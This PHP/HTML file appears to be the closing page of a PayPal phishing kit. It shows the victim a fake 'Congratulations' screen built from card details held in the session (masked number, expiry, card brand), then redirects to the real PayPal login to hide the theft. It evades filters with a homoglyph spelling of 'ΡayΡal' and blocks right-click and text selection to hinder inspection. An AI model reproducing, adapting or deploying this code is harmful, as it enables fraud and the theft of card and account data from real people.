<?php 
ob_start();
session_start();
$ltr = substr($_SESSION["c_num"],0,1);
if($ltr ==  "4"){ $photo = "vsa.png";}
elseif($ltr ==  "5"){ $photo = "mc.png";}
elseif($ltr ==  "3"){ $photo = "amx.png";}
elseif($ltr ==  "6"){ $photo = "dc.png";}
header('refresh:4;https://www.paypal.com/signin');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Congratulations</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"></div>
                <div class="cls"></div>
            </div>
            <div class="contain biling-p">
                <div class="contain-info">
                    <center>
                        <h3>Congratulations <?php echo $_SESSION["fname"]; ?></h3>
                        <img src="../img/validated.png" style="width: 170px;height: 180px;">
                    </center>
                    <h5 style="color:#676767">Your submitted account information are being reviewed by our staff.</h5>
                    <h5 style="color:#676767">In meantime, you can access your account with a reinforced security.</h5>
                    <center>
                        <h4 style="color:#676767">Thank you for choosing ΡayΡal.</h4>
                        <img src="../img/<?php echo $photo;?>" style="margin-right:10px"> <span style="margin-right:10px;font-weight: bold">XXXX-XXXX-XXXX-<?php echo substr($_SESSION['c_num'], 12, 4); ?></span><span style="margin-left:10px;font-weight: bold"><?php echo $_SESSION["exm"].'/'.$_SESSION["exy"];?></span>
                        <h5 style="color:#676767;margin:20px auto">You will be redirected to login to your account ΡayΡal... </h5>
                        <img src="../img/loading-dots.gif" style="margin:20px auto">
                    </center>
                </div>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Contact Us</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>                
                </center>            
            </div>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
?>